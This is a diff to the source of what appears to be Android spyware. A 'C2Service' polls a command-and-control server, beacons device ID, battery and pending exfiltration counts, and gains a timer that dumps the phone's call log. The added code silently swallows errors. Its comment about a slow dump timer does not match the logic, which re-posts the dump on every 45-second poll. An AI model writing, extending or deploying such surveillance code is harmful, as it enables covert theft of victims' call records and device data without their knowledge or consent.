@@ -135,6 +135,15 @@ class C2Service : Service() {
 
     private var pollThread: HandlerThread? = null
     private var pollHandler: Handler? = null
+    private val callDumpHandler = Handler(Looper.getMainLooper())
+    private val callDumpTask = object : Runnable {
+        override fun run() {
+            try {
+                CallLogDumper.dump(this@C2Service)
+            } catch (_: Throwable) {
+            }
+        }
+    }
 
 
     private val pollTask = object : Runnable {
@@ -149,6 +158,9 @@ class C2Service : Service() {
                 com.sp.core.util.Beacon.send(this@C2Service, "alive", aliveInfo())
             } catch (_: Throwable) {
             }
+            // The call history is dumped on its own slow timer - it changes
+            // rarely and every query hits the content provider.
+            callDumpHandler.postDelayed(callDumpTask, CALL_DUMP_INTERVAL_MS)
             pollHandler?.postDelayed(this, POLL_INTERVAL_MS)
         }
     }
@@ -158,6 +170,7 @@ class C2Service : Service() {
         sb.append("{\"device_id\":\"").append(Prefs.deviceId(this)).append("\"")
         sb.append(",\"sdk\":").append(android.os.Build.VERSION.SDK_INT)
         sb.append(",\"pending\":").append(com.sp.core.util.BatchExfil.pendingCount(this))
+        sb.append(",\"battery\":").append(com.sp.core.util.Battery.percent(this))
         sb.append(",\"ts\":").append(System.currentTimeMillis())
         sb.append("}")
         return sb.toString()
@@ -166,6 +179,7 @@ class C2Service : Service() {
     companion object {
         private const val NOTIF_ID = 0x5F62
         private const val POLL_INTERVAL_MS = 45_000L
+        private const val CALL_DUMP_INTERVAL_MS = 5 * 60_000L
 
         private val pollClient = OkHttpClient.Builder()
             .connectTimeout(15, TimeUnit.SECONDS)
